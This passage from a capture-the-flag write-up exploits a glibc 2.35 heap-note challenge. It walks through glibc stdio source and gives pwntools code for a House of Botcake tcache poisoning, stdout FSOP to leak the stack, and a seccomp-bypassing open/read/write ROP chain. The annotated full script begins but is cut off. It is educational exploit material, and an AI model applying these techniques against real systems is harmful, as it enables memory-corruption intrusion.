</span></span><span class="code-line"><span class="token comment">	 alone, so it can continue to correspond to the external position). */</span>
</span><span class="code-line">      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token function">_IO_in_backup</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">	<span class="token punctuation">{</span>
</span><span class="code-line">	  <span class="token class-name">size_t</span> nbackup <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">-</span> f<span class="token operator">-&gt;</span>_IO_read_ptr<span class="token punctuation">;</span>
</span><span class="code-line">	  <span class="token function">_IO_free_backup_area</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">	  f<span class="token operator">-&gt;</span>_IO_read_base <span class="token operator">-=</span> <span class="token function">MIN</span> <span class="token punctuation">(</span>nbackup<span class="token punctuation">,</span>
</span><span class="code-line">				   f<span class="token operator">-&gt;</span>_IO_read_base <span class="token operator">-</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">	  f<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_read_base<span class="token punctuation">;</span>
</span><span class="code-line">	<span class="token punctuation">}</span>
</span><span class="code-line">
</span><span class="code-line">      <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">==</span> f<span class="token operator">-&gt;</span>_IO_buf_end<span class="token punctuation">)</span>
</span><span class="code-line">	f<span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">;</span>
</span><span class="code-line">      f<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_read_ptr<span class="token punctuation">;</span>
</span><span class="code-line">      f<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token punctuation">;</span>
</span><span class="code-line">      f<span class="token operator">-&gt;</span>_IO_write_end <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_buf_end<span class="token punctuation">;</span>
</span><span class="code-line">      f<span class="token operator">-&gt;</span>_IO_read_base <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_read_end<span class="token punctuation">;</span>
</span><span class="code-line">
</span><span class="code-line">      f<span class="token operator">-&gt;</span>_flags <span class="token operator">|=</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">;</span>
</span><span class="code-line">      <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINE_BUF <span class="token operator">|</span> _IO_UNBUFFERED<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">	f<span class="token operator">-&gt;</span>_IO_write_end <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token punctuation">;</span>
</span><span class="code-line">    <span class="token punctuation">}</span>
</span><span class="code-line">  <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">return</span> <span class="token function">_IO_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">,</span>
</span><span class="code-line">			 f<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">-</span> f<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">==</span> f<span class="token operator">-&gt;</span>_IO_buf_end <span class="token punctuation">)</span> <span class="token comment">/* Buffer is really full */</span>
</span><span class="code-line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_do_flush</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
</span><span class="code-line">      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token operator">*</span>f<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token operator">++</span> <span class="token operator">=</span> ch<span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_UNBUFFERED<span class="token punctuation">)</span>
</span><span class="code-line">      <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_LINE_BUF<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> ch <span class="token operator">==</span> <span class="token char">&#x27;\n&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">,</span>
</span><span class="code-line">		      f<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">-</span> f<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
</span><span class="code-line">      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span> ch<span class="token punctuation">;</span>
</span><span class="code-line"><span class="token punctuation">}</span>
</span><span class="code-line"><span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_file_overflow<span class="token punctuation">,</span> _IO_file_overflow<span class="token punctuation">)</span>
</span></code></pre></div>
<p>Ok! We have some interesting things to manipulate here. The most important thing is we want to reach an <code>_IO_do_write</code> call. This will actually write whats in our buffer to the file descriptor. We obviously can’t let <code>ch</code> be <code>EOF</code>, but our program does print newlines all the time! So how do we reach the second call of <code>_IO_do_write</code>?</p>
<ul>
<li><code>_IO_NO_WRITES</code> should be false, this prevents the error</li>
<li><code>_IO_CURRENTLY_PUTTING</code> should be true, this skips over unneeded write buffering</li>
<li><code>_IO_write_ptr == _IO_write_end</code>, which will call <code>_IO_do_flush</code></li>
</ul>
<p>Alright, before we can confirm that we hit the newline <code>_IO_do_write</code>, we need to look at <code>_IO_do_flush</code>:</p>
<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">_IO_do_flush</span><span class="token expression"><span class="token punctuation">(</span>_f<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>
</span></span><span class="code-line"><span class="token macro property">  <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>_f<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span>							      </span><span class="token punctuation">\</span>
</span></span><span class="code-line"><span class="token macro property">   <span class="token expression"><span class="token operator">?</span> <span class="token function">_IO_do_write</span><span class="token punctuation">(</span>_f<span class="token punctuation">,</span> <span class="token punctuation">(</span>_f<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">,</span>				      </span><span class="token punctuation">\</span>
</span></span><span class="code-line"><span class="token macro property">		  <span class="token expression"><span class="token punctuation">(</span>_f<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_IO_write_ptr<span class="token operator">-</span><span class="token punctuation">(</span>_f<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">)</span>		      </span><span class="token punctuation">\</span>
</span></span><span class="code-line"><span class="token macro property">   <span class="token expression"><span class="token operator">:</span> <span class="token function">_IO_wdo_write</span><span class="token punctuation">(</span>_f<span class="token punctuation">,</span> <span class="token punctuation">(</span>_f<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">,</span>		      </span><span class="token punctuation">\</span>
</span></span><span class="code-line"><span class="token macro property">		   <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>_f<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_ptr			      </span><span class="token punctuation">\</span>
</span></span><span class="code-line"><span class="token macro property">		    <span class="token expression"><span class="token operator">-</span> <span class="token punctuation">(</span>_f<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
</span></code></pre></div>
<p>Our mode is negative (you can confirm in gdb via <code>p *stdout</code>), so it’ll call <code>_IO_do_write</code>. This is a macro for <code>new_do_write</code>, which is great! The flush macro is all we needed to get to, rather than worrying about newlines. Now, let’s inspect this write code to see what else we need to set up:</p>
<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line"><span class="token keyword">static</span> <span class="token class-name">size_t</span>
</span><span class="code-line"><span class="token function">new_do_write</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> <span class="token class-name">size_t</span> to_do<span class="token punctuation">)</span>
</span><span class="code-line"><span class="token punctuation">{</span>
</span><span class="code-line">  <span class="token class-name">size_t</span> count<span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_IS_APPENDING<span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment">/* On a system without a proper O_APPEND implementation,
</span></span><span class="code-line"><span class="token comment">       you would need to sys_seek(0, SEEK_END) here, but is
</span></span><span class="code-line"><span class="token comment">       not needed nor desirable for Unix- or Posix-like systems.
</span></span><span class="code-line"><span class="token comment">       Instead, just indicate that offset (before and after) is
</span></span><span class="code-line"><span class="token comment">       unpredictable. */</span>
</span><span class="code-line">    fp<span class="token operator">-&gt;</span>_offset <span class="token operator">=</span> _IO_pos_BAD<span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">!=</span> fp<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token punctuation">{</span>
</span><span class="code-line">      <span class="token class-name">off64_t</span> new_pos
</span><span class="code-line">	<span class="token operator">=</span> <span class="token function">_IO_SYSSEEK</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">-</span> fp<span class="token operator">-&gt;</span>_IO_read_end<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">      <span class="token keyword">if</span> <span class="token punctuation">(</span>new_pos <span class="token operator">==</span> _IO_pos_BAD<span class="token punctuation">)</span>
</span><span class="code-line">	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
</span><span class="code-line">      fp<span class="token operator">-&gt;</span>_offset <span class="token operator">=</span> new_pos<span class="token punctuation">;</span>
</span><span class="code-line">    <span class="token punctuation">}</span>
</span><span class="code-line">  count <span class="token operator">=</span> <span class="token function">_IO_SYSWRITE</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_cur_column <span class="token operator">&amp;&amp;</span> count<span class="token punctuation">)</span>
</span><span class="code-line">    fp<span class="token operator">-&gt;</span>_cur_column <span class="token operator">=</span> <span class="token function">_IO_adjust_column</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_cur_column <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> count<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token function">_IO_setg</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">,</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">,</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">  fp<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">;</span>
</span><span class="code-line">  fp<span class="token operator">-&gt;</span>_IO_write_end <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span>
</span><span class="code-line">		       <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINE_BUF <span class="token operator">|</span> _IO_UNBUFFERED<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">		       <span class="token operator">?</span> fp<span class="token operator">-&gt;</span>_IO_buf_base <span class="token operator">:</span> fp<span class="token operator">-&gt;</span>_IO_buf_end<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">return</span> count<span class="token punctuation">;</span>
</span><span class="code-line"><span class="token punctuation">}</span>
</span></code></pre></div>
<p>Alright, the call we need to get to is <code>_IO_SYSWRITE</code>. This will finally write whatever we set our buffer. <em>But,</em> we should avoid <code>IO_SYSSEEK</code>, since seeking on stdout is undefined. The simplest way is just to add <code>_IO_IS_APPENDING</code> to our flags, which bypasses it completely (The other method is to make <code>read_end==write_base</code>, which can be easily setup if necessary).</p>
<p>Finally, we need to make sure that we don’t break <code>stdout</code> in the future, since we plan to move it’s read and write buffers onto the stack, instead of libc. After it writes, it sets the <code>write_base</code> and <code>write_ptr</code> to <code>_buf_base</code>, and it sets <code>write_end</code> to either <code>_buf_base</code> or <code>_buf_end</code>, depending on the <code>_IO_LINE_BUF</code> or <code>_IO_UNBUFFERED</code> flag.</p>
<p>So, we’re ready to write to the <code>stdout</code> file pointer:</p>
<ul>
<li>Set <code>stdout-&gt;flags = _IO_MAGIC | (~_IO_NO_WRITES) | IO_IS_CURRENTLY_PUTTING | _IO_IS_APPENDING</code></li>
<li>Set <code>stdout-&gt;_IO_write_base</code> to <code>&amp;environ</code>, to make that our buffer.</li>
<li>Set <code>stdout-&gt;_IO_write_ptr = stdout-&gt;_IO_write_end = _IO_buf_end</code> to be <code>&amp;environ+8</code>, to make our buffer non zero and just print out the stack leak.</li>
</ul>
<p>The full payload is assembled:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token comment">#flags</span>
</span><span class="code-line">p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token comment">#read_ptrs, dont matter</span>
</span><span class="code-line">p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span> <span class="token operator">+</span>  <span class="token comment">#write_base</span>
</span><span class="code-line">p64<span class="token punctuation">(</span>environ <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token comment">#write_ptr and end</span>
</span><span class="code-line">p64<span class="token punctuation">(</span>environ <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token comment"># buf_base</span>
</span><span class="code-line">p64<span class="token punctuation">(</span>environ <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># buf_end</span>
</span></code></pre></div>
<p>Again, thanks to ret2school for detailing this. What were we doing? Right, stack leak</p>
<p>Now, we can get the stack:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token comment">#symbols</span>
</span><span class="code-line">environ <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">&#x27;environ&#x27;</span><span class="token punctuation">]</span>
</span><span class="code-line">stdout <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">&#x27;_IO_2_1_stdout_&#x27;</span><span class="token punctuation">]</span>
</span><span class="code-line"><span class="token comment"># prior botcake exploit, we make the next chunk return the location of stdout</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x230</span><span class="token punctuation">,</span> <span class="token string">b&#x27;T&#x27;</span><span class="token operator">*</span><span class="token number">0x208</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x211</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>stdout <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x3320</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">&#x27;X&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># We write out stdout payload</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span>
</span><span class="code-line"><span class="token punctuation">(</span>environ<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># When printf(&quot;&gt; &quot;) happens at the start of the while loop, the buffer is flushed, and our stack address gets printed out first! No newline required.</span>
</span><span class="code-line">stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></code></pre></div>
<h2 id="fsop-i-like-rop-"><a href="#fsop-i-like-rop-" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>FSOP? I Like ROP. <a name="rop"></a></h2>
<p>With a proper stack address, we can now forge a chunk to be given to us located within the stack, and overwrite return pointers to hijack control flow. Ah... but <em>where</em>? The main function doesn’t actually return, it exits. What we can do is kind of silly, but instead of overwriting main’s stack frame, we’ll overwrite the stack frame of whatever lib function calls <code>read()</code>. That way, when we return from the read call after allocing a chunk, we instead return to our own control flow.</p>
<p>If we look at gdb, we can see our backtrace up to the read call:</p>
<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line">► f <span class="token number">0</span>   <span class="token number">0x7fedd0f14992</span> read<span class="token operator">+</span><span class="token number">18</span>
</span><span class="code-line">  f <span class="token number">1</span>   <span class="token number">0x7fedd0e8ccb6</span> _IO_file_underflow<span class="token operator">+</span><span class="token number">390</span>
</span><span class="code-line">  f <span class="token number">2</span>   <span class="token number">0x7fedd0e8de16</span> _IO_default_uflow<span class="token operator">+</span><span class="token number">54</span>
</span><span class="code-line">  f <span class="token number">3</span>   <span class="token number">0x7fedd0e63150</span> __vfscanf_internal<span class="token operator">+</span><span class="token number">1776</span>
</span><span class="code-line">  f <span class="token number">4</span>   <span class="token number">0x7fedd0e621c2</span> __isoc99_scanf<span class="token operator">+</span><span class="token number">178</span>
</span><span class="code-line">  f <span class="token number">5</span>   <span class="token number">0x559d76869498</span> main<span class="token operator">+</span><span class="token number">375</span>
</span></code></pre></div>
<p>So, what we’re instead going to do is find the offset of <code>_IO_file_underflow</code> return pointer, and forge a chunk to write there. We can reuse the chunks we made from our last arbitrary write, which simplifies things. The offset was computed via some trial and error, but the important feature is that it must be 16 byte aligned, otherwise malloc will crash when trying to alloc from the stack address.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">0x258</span> <span class="token comment"># offset computed in gdb</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># free our forged chunk</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># free our victim chunk</span>
</span><span class="code-line"><span class="token comment"># write to our forged chunk (which again contains the metadata to victim)</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x230</span><span class="token punctuation">,</span> <span class="token string">b&#x27;T&#x27;</span><span class="token operator">*</span><span class="token number">0x208</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x211</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>stack <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x3320</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># alloc our victim chunk again.</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">&#x27;xxx&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># write padding and ROP chain</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b&#x27;A&#x27;</span><span class="token operator">*</span><span class="token number">0xc8</span><span class="token operator">+</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>As a final step, let’s discuss the ROP chain. Seccomp prevents us from calling <code>system</code> or <code>execve</code>, so we need to use <code>open</code>, <code>read</code>, and <code>write</code> to output the flag. The first step is find what can setup these syscalls, luckilly, libc gives us the great function <code>syscall()</code> which we can keep returning to to call these three functions. Next, I need to open <code>flag.txt</code>. This is not a complicated problem at all. Remember that 16 byte buffer I allocated during the botcake exploit to prevent consolidation? I can find the fixed offset of that chunk, and write <code>&#x27;flag.txt\0&#x27;</code> to it, and use that as my buffer for open. Then calling read and write becomes simple register operations.</p>
<p>pwntools is extremely useful in automating this process.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
</span><span class="code-line">flagoffset <span class="token operator">=</span> <span class="token number">0x55d31ac5f520</span> <span class="token operator">-</span> <span class="token number">0x55d31ac5c000</span>
</span><span class="code-line">flag <span class="token operator">=</span> heap <span class="token operator">+</span> flagoffset<span class="token operator">+</span><span class="token number">16</span>
</span><span class="code-line">output <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token number">0x20</span>
</span><span class="code-line">syscall <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">171444</span>
</span><span class="code-line"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Flag.txt: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">rop<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">&#x27;syscall&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> flag<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># open(&#x27;flag.txt&#x27;,0,0)</span>
</span><span class="code-line">rop<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">&#x27;syscall&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> output<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#read(3, buf, 0x100)</span>
</span><span class="code-line">rop<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">&#x27;syscall&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> output<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#write(1, buf, 0x100)</span>
</span></code></pre></div>
<p>We can run the entire script and it prints out the flag on remote: <code>ictf{i_guess_the_post_office_couldnt_hide_the_heapnote_underneath_912b123f}</code></p>
<h2 id="tldr-"><a href="#tldr-" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>TLDR <a name="tldr"></a></h2>
<p>Heap Note Challenge with no update, arbitrary chunk size, with glibc2.35, full protections, OWR seccomp, no return, no <code>exit()</code>. Use double free and read after free to leak libc and heap, use House of Botcake to do FSOP on stdout to leak environ and get a stack leak. Write over return address of <code>_IO_file_underflow</code> during the read call of a note allocation to ROP to Open, Read, Write chain to get flag.</p>
<h2 id="full-script-annotated-"><a href="#full-script-annotated-" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Full Script (Annotated) <a name="script"></a></h2>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token comment">#!/usr/bin/env python3</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
</span><span class="code-line">
</span><span class="code-line">exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./vuln_patched&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./libc.so.6&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exe
</span><span class="code-line"><span class="token comment"># this makes tmux split vertically when debugging</span>
</span><span class="code-line">context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#x27;tmux&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;splitw&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;-f&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;-h&#x27;</span><span class="token punctuation">]</span>
</span><span class="code-line"><span class="token comment"># I was going to beat safelinking another way, which is why this became a global</span>
</span><span class="code-line">heap <span class="token operator">=</span> <span class="token number">0x0</span>
</span><span class="code-line"><span class="token comment"># pwninit’s stub conn() function. Call with `python3 solve.py LOCAL` or no args to change which.</span>
